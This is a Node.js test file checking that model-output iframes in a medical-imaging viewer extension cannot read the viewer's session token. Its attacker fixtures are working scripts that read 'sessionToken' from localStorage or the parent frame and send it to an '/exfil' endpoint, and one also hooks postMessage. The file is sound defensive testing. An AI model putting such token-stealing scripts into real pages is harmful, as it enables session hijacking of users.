/**
 * The WEB_APP output modal loads a model container's page in an iframe on the
 * viewer's origin. These tests fail while that frame can read the viewer's
 * session token, and pass once the frame is isolated.
 *
 * Run: node --test extensions/pacs-ai-inference/src/webappIframeSecurity.test.mjs
 */
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { rm } from 'node:fs/promises';
import http from 'node:http';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const depsDir = path.join(tmpdir(), 'pacs-ai-iframe-security-deps');
const SESSION_TOKEN_PLACEHOLDER = 'PLACEHOLDER_SESSION_TOKEN';
const CONTAINER_NAME = 'attacker-model';
const WEBAPP_PATH = '/app/viewer/index.html';
const CHROME = process.env.CHROME_PATH || '/usr/bin/google-chrome';

const ATTACKER_DOCUMENT = `<!doctype html>
<meta charset="utf-8">
<title>model web app</title>
<script>
(function () {
  var token = '';
  var via = 'none';
  try {
    var direct = localStorage.getItem('sessionToken');
    if (direct) { token = direct; via = 'localStorage'; }
  } catch (e) {}
  if (!token) {
    try {
      var fromParent = parent.localStorage.getItem('sessionToken');
      if (fromParent) { token = fromParent; via = 'parent.localStorage'; }
    } catch (e) {}
  }
  var targetOrigin = '';
  var reportedOrigin = false;
  var original = window.postMessage.bind(window);
  window.postMessage = function (message, origin, transfer) {
    targetOrigin = String(origin);
    if (!reportedOrigin) {
      reportedOrigin = true;
      report();
    }
    return original(message, origin, transfer);
  };
  function report() {
    var img = new Image();
    img.src = '/exfil?kind=webapp&token=' + encodeURIComponent(token) +
      '&via=' + encodeURIComponent(via) +
      '&targetOrigin=' + encodeURIComponent(targetOrigin);
  }
  report();
})();
</script>
`;

function nginxRewrite(browserPath) {
  // pacs-ai-backend nginx/default.conf: rewrite ^/api(/.*)$ $1 break;
  const match = browserPath.match(/^\/api(\/.*)$/);
  return match ? match[1] : null;
}

function upstreamPath(apiPath) {
  // DockerInferenceProxy strips /proxy/docker-inference/<name>/app/viewer.
  // httputil.joinURLPath then joins target /app/viewer with that remainder.
  // /app/viewer has no trailing slash and the remainder starts with /, so the
  // join is the two strings concatenated.
  const match = apiPath.match(/^\/proxy\/docker-inference\/([^/]+)\/app\/viewer(\/.*)$/);
  if (!match) {
    return null;
  }
  return {
    containerName: decodeURIComponent(match[1]),
    joined: '/app/viewer' + match[2],
  };
}

async function ensureDeps() {
  const require = createRequire(path.join(depsDir, 'package.json'));
  try {
    require.resolve('esbuild');
    require.resolve('react');
    require.resolve('react-dom/client');
    return require;
  } catch {
    const { mkdir, writeFile } = await import('node:fs/promises');
    await mkdir(depsDir, { recursive: true });
    await writeFile(
      path.join(depsDir, 'package.json'),
      JSON.stringify({ private: true, dependencies: { esbuild: '0.25.0', react: '18.3.1', 'react-dom': '18.3.1' } })
    );
    await new Promise((resolve, reject) => {
      const child = spawn('npm', ['install', '--silent', '--no-fund', '--no-audit'], {
        cwd: depsDir,
        stdio: 'inherit',
      });
      child.on('exit', code => (code === 0 ? resolve() : reject(new Error('npm install failed'))));
    });
    return createRequire(path.join(depsDir, 'package.json'));
  }
}

function stubPlugin() {
  const stubs = new Map([
    ['react-router-dom', 'export function useNavigate(){ return () => {}; }'],
    [
      '@pacs-ai/extension-core/src/api/dto',
      'export const Error = { UNAUTHORIZED_ACCESS: "UNAUTHORIZED_ACCESS" };',
    ],
    [
      '@pacs-ai/extension-core/src/service/userService',
      'export function logoutUser() {}',
    ],
    [
      'react-i18next',
      'export function useTranslation(){ return { t: (key) => key }; }',
    ],
    [
      '@pacs-ai/extension-core/src/api/inferenceRepository',
      `export default { PredictInferenceModel: async () => ({ data: { webappPath: ${JSON.stringify(WEBAPP_PATH)}, webappDataBase64: 'PLACEHOLDER_WEBAPP_DATA' } }) };`,
    ],
    [
      '@pacs-ai/extension-core/src/providers/AlertProvider',
      'import React from "react"; export const AlertContext = React.createContext(() => {});',
    ],
    [
      '@pacs-ai/extension-core/src/hooks/useStudyContext',
      `export default function useStudyContext(){
        return { selectedModalities: { XA: { modality: 'XA', studies: [{ studyInstanceUID: '1.2.3', date: '2020-01-01', description: 'Exam' }] } } };
      }`,
    ],
    [
      '@pacs-ai/extension-core/src/hooks/useAvailableModels',
      'export default function useAvailableModels(){ return { refreshingAvailableModels: false }; }',
    ],
    [
      '@pacs-ai/extension-core/src/services/PacsAiModelsService',
      'export const pacsAiModelsService = { refreshAvailableModels() {} };',
    ],
    [
      '@pacs-ai/extension-core/src/api/orthancRepository',
      'export default { GetLnkedDICOMModalityWithEnabledCStore: async () => ({ data: null }) };',
    ],
    ['@pacs-ai/ui', 'export function StoreFileButton(){ return null; }'],
    [
      '@pacs-ai/ui/src/components/SelectSeriesModal',
      `import React from "react";
       export default function SelectSeriesModal(props){
         React.useEffect(() => {
           props.applyPredictInferenceModel(
             props.selectedInferenceModel.containerId,
             ['series-1'],
             '1.2.3',
             {},
             props.selectedInferenceModel.outputMode
           );
         }, []);
         return null;
       }`,
    ],
    [
      'viewer-results',
      `export function useViewerModelResults(){
         return {
           canRunManaged: true,
           refreshLatestResults: async () => {},
           getLatestResult: () => null,
           getPendingRun: () => null,
           getResultSeriesScope: () => null,
           getResultRuns: () => [],
           startForegroundRun: async () => { throw new Error('managed run should not be used'); },
           dismissForegroundRun: () => {},
           openResult: () => {},
         };
       }`,
    ],
    [
      'add-segmentation',
      'export async function addSegmentationFromLabelmap(){ return ""; }',
    ],
    [
      'viewer-results-model',
      `export function formatRunDateTime(value){ return value || ''; }
       export function isSameResultRun(){ return false; }
       export function viewerModelKey(model){ return model.containerId || model.modelName || ''; }`,
    ],
  ]);

  return {
    name: 'security-test-stubs',
    setup(build) {
      build.onResolve({ filter: /.*/ }, args => {
        if (args.path.endsWith('ViewerModelResultsProvider')) {
          return { path: 'viewer-results', namespace: 'stub' };
        }
        if (args.path.endsWith('viewerResultsModel')) {
          return { path: 'viewer-results-model', namespace: 'stub' };
        }
        if (args.path.endsWith('utils/addSegmentation')) {
          return { path: 'add-segmentation', namespace: 'stub' };
        }
        if (stubs.has(args.path) || args.path.endsWith('AddModelFeedback') || args.path.endsWith('OutputModeModal')) {
          if (args.path.endsWith('WebappOutputModeModal') || args.path.endsWith('HTMLOutputModeModal')) {
            return null;
          }
          return { path: args.path, namespace: 'stub' };
        }
        if (args.path.endsWith('.png')) {
          return { path: args.path, namespace: 'png' };
        }
        return null;
      });
      build.onLoad({ filter: /.*/, namespace: 'stub' }, args => {
        const resolveDir = depsDir;
        if (args.path.endsWith('AddModelFeedback') || args.path.endsWith('OutputModeModal')) {
          return {
            contents: 'import React from "react"; export default function Stub(){ return null; }',
            loader: 'js',
            resolveDir,
          };
        }
        return { contents: stubs.get(args.path), loader: 'js', resolveDir };
      });
      build.onLoad({ filter: /.*/, namespace: 'png' }, () => ({
        contents: 'export default "data:image/png;base64,";',
        loader: 'js',
      }));
    },
  };
}

async function bundle(require, entry) {
  const esbuild = require('esbuild');
  const result = await esbuild.build({
    stdin: {
      contents: entry,
      resolveDir: here,
      sourcefile: 'harness.tsx',
      loader: 'tsx',
    },
    bundle: true,
    format: 'iife',
    platform: 'browser',
    write: false,
    plugins: [stubPlugin()],
    nodePaths: [path.join(depsDir, 'node_modules')],
    define: {
      'process.env.NODE_ENV': '"development"',
      'process.env.APP_PUBLIC_API_URL': 'window.__API_URL',
    },
    logLevel: 'silent',
  });
  return result.outputFiles[0].text;
}

function listen(handler) {
  const server = http.createServer(handler);
  return new Promise(resolve => {
    server.listen(0, '127.0.0.1', () => resolve(server));
  });
}

function startChrome(url) {
  const userData = path.join(tmpdir(), `chrome-iframe-${process.pid}-${Date.now()}`);
  const child = spawn(
    CHROME,
    [
      '--headless=new',
      '--disable-gpu',
      '--no-sandbox',
      '--disable-dev-shm-usage',
      `--user-data-dir=${userData}`,
      url,
    ],
    { stdio: 'ignore' }
  );
  return {
    child,
    async stop() {
      child.kill('SIGKILL');
      await rm(userData, { recursive: true, force: true }).catch(() => {});
    },
  };
}

function assertFrameCannotReadSession(parentReport, exfil) {
  assert.equal(parentReport?.present, true, 'the viewer did not render the model iframe');
  const sandbox = parentReport.sandbox;
  const tokens = sandbox == null ? [] : sandbox.split(/\s+/).filter(Boolean);
  const scriptsAllowed = sandbox == null || tokens.includes('allow-scripts');
  const sameOriginSandbox = sandbox == null || tokens.includes('allow-same-origin');
  let srcOrigin = '';
  try {
    srcOrigin = new URL(parentReport.src, parentReport.pageOrigin).origin;
  } catch {
    srcOrigin = '';
  }
  const sameOriginDocument = srcOrigin === parentReport.pageOrigin || parentReport.srcdoc === true;
  const isolated =
    !scriptsAllowed ||
    (scriptsAllowed && !sameOriginSandbox) ||
    !sameOriginDocument;

  const stolen = exfil?.token === SESSION_TOKEN_PLACEHOLDER;
  assert.equal(
    stolen,
    false,
    `model frame read sessionToken via ${exfil?.via || 'an unknown path'} (postMessage target ${exfil?.targetOrigin || 'not observed'})`
  );
  if (exfil?.targetOrigin === '*') {
    assert.fail('model frame received postMessage with target origin *');
  }
  if (!exfil && !isolated) {
    assert.fail('same-origin frame did not run its page and is not isolated');
  }
}

const webappHarness = `
import React, { useEffect } from 'react';
import { createRoot } from 'react-dom/client';
import AIModelButton from './AIModelButton/AIModelButton';
import { AlertContext } from '@pacs-ai/extension-core/src/providers/AlertProvider';

const model = {
  modelId: 'attacker-model',
  containerId: 'container-1',
  containerName: ${JSON.stringify(CONTAINER_NAME)},
  modelName: 'Attacker',
  version: '1',
  outputMode: 'WEB_APP',
  supportedDicomModalities: ['XA'],
  supportedAdditionalMetadata: [{ id: 'note', name: 'Note', type: 'string', required: false }],
};

function Harness() {
  useEffect(() => {
    let stopped = false;
    const tick = () => {
      if (stopped) return;
      const row = [...document.querySelectorAll('li')].find(item => (item.textContent || '').includes('WEB_APP'));
      if (row) {
        row.dispatchEvent(new MouseEvent('click', { bubbles: true }));
        stopped = true;
        return;
      }
      const button = document.querySelector('[data-tour-id="ai-model-button"]');
      if (button) button.dispatchEvent(new MouseEvent('click', { bubbles: true }));
      setTimeout(tick, 50);
    };
    tick();
    return () => { stopped = true; };
  }, []);
  return React.createElement(AlertContext.Provider, { value: () => {} },
    React.createElement(AIModelButton, {
      servicesManager: {},
      inferenceAvailableModels: [model],
    })
  );
}

window.__API_URL = location.origin + '/api';
localStorage.setItem('sessionToken', ${JSON.stringify(SESSION_TOKEN_PLACEHOLDER)});
createRoot(document.getElementById('root')).render(React.createElement(Harness));
setInterval(() => {
  const iframe = document.getElementById('myIframe');
  if (!iframe) return;
  navigator.sendBeacon('/parent-report', JSON.stringify({
    present: true,
    sandbox: iframe.getAttribute('sandbox'),
    src: iframe.src,
    pageOrigin: location.origin,
  }));
}, 100);
`;

const htmlHarness = `
import React from 'react';
import { createRoot } from 'react-dom/client';
import HTMLOutputModeModal from './HTMLOutputModeModal';

const page = '<script>(function(){var token="";var via="none";try{var direct=localStorage.getItem("sessionToken");if(direct){token=direct;via="localStorage";}}catch(e){}if(!token){try{var fromParent=parent.localStorage.getItem("sessionToken");if(fromParent){token=fromParent;via="parent.localStorage";}}catch(e){}}new Image().src="/exfil?kind=html&token="+encodeURIComponent(token)+"&via="+encodeURIComponent(via);})();</script>';
const htmlBase64 = btoa(page);

window.__API_URL = location.origin + '/api';
localStorage.setItem('sessionToken', ${JSON.stringify(SESSION_TOKEN_PLACEHOLDER)});
createRoot(document.getElementById('root')).render(React.createElement(HTMLOutputModeModal, {
  isOpen: true,
  onClose: () => {},
  data: { htmlBase64 },
  modelName: 'Attacker',
  modelVersion: '1',
  seriesInstanceUIDs: '[]',
  outputMode: 'HTML',
  loading: false,
  title: 'Attacker',
  selectedInferenceModel: null,
}));
setInterval(() => {
  const iframe = document.querySelector('iframe[title="HTML Content"]');
  if (!iframe) return;
  navigator.sendBeacon('/parent-report', JSON.stringify({
    present: true,
    sandbox: iframe.getAttribute('sandbox'),
    src: iframe.getAttribute('src') || '',
    srcdoc: true,
    pageOrigin: location.origin,
  }));
}, 100);
`;

function pageHtml(scriptName) {
  return `<!doctype html><html><head><meta charset="utf-8"></head><body><div id="root"></div><script src="/${scriptName}"></script></body></html>`;
}

async function runCase(name, script, pathname) {
  const require = await ensureDeps();
  const code = await bundle(require, script);
  const reports = { parent: null, exfil: null };
  const server = await listen((req, res) => {
    const url = new URL(req.url || '/', 'http://127.0.0.1');
    if (req.method === 'GET' && url.pathname === pathname) {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(pageHtml(name + '.js'));
      return;
    }
    if (req.method === 'GET' && url.pathname === `/${name}.js`) {
      res.writeHead(200, { 'content-type': 'text/javascript; charset=utf-8' });
      res.end(code);
      return;
    }
    if (req.method === 'POST' && url.pathname === '/parent-report') {
      const chunks = [];
      req.on('data', chunk => chunks.push(chunk));
      req.on('end', () => {
        reports.parent = JSON.parse(Buffer.concat(chunks).toString('utf8'));
        res.writeHead(204);
        res.end();
      });
      return;
    }
    if (req.method === 'GET' && url.pathname === '/exfil') {
      const token = url.searchParams.get('token') || '';
      const next = {
        token,
        via: url.searchParams.get('via') || '',
        targetOrigin: url.searchParams.get('targetOrigin') || '',
        kind: url.searchParams.get('kind') || '',
      };
      if (!reports.exfil || next.token || next.targetOrigin) {
        reports.exfil = { ...(reports.exfil || {}), ...next, token: next.token || reports.exfil?.token || '' };
        if (next.targetOrigin) reports.exfil.targetOrigin = next.targetOrigin;
      }
      res.writeHead(204);
      res.end();
      return;
    }
    const rewritten = nginxRewrite(url.pathname);
    const upstream = rewritten ? upstreamPath(rewritten) : null;
    if (
      req.method === 'GET' &&
      upstream &&
      upstream.containerName === CONTAINER_NAME &&
      upstream.joined === '/app/viewer/index.html'
    ) {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(ATTACKER_DOCUMENT);
      return;
    }
    res.writeHead(404);
    res.end();
  });
  const { port } = server.address();
  const chrome = startChrome(`http://127.0.0.1:${port}${pathname}`);
  const deadline = Date.now() + 8000;
  const started = Date.now();
  while (Date.now() < deadline) {
    const exfil = reports.exfil;
    const sawTarget = Boolean(exfil?.targetOrigin);
    const sawEmptyToken = Boolean(reports.parent && exfil && !exfil.token && Date.now() - started > 1500);
    if (reports.parent && exfil?.token && (sawTarget || exfil.kind === 'html')) break;
    if (sawEmptyToken) break;
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  await chrome.stop();
  await new Promise(resolve => server.close(resolve));
  return reports;
}

test('WEB_APP output iframe cannot read the viewer session token', { timeout: 120000 }, async () => {
  const reports = await runCase('webapp', webappHarness, '/');
  assertFrameCannotReadSession(reports.parent, reports.exfil);
});

test('HTML model output iframe cannot read the viewer session token', { timeout: 120000 }, async () => {
  const reportSource = readFileSync(path.join(here, 'htmlReport.ts'), 'utf8');
  const sandbox = reportSource.match(/HTML_REPORT_IFRAME_SANDBOX = '([^']*)'/)?.[1];
  const drawer = readFileSync(path.join(here, 'viewerResults/ViewerModelResultDrawer.tsx'), 'utf8');
  assert.match(drawer, /sandbox=\{HTML_REPORT_IFRAME_SANDBOX\}/);
  const reports = await runCase('html', htmlHarness, '/html');
  assert.equal(reports.parent?.sandbox, sandbox);
  assertFrameCannotReadSession(reports.parent, reports.exfil);
});
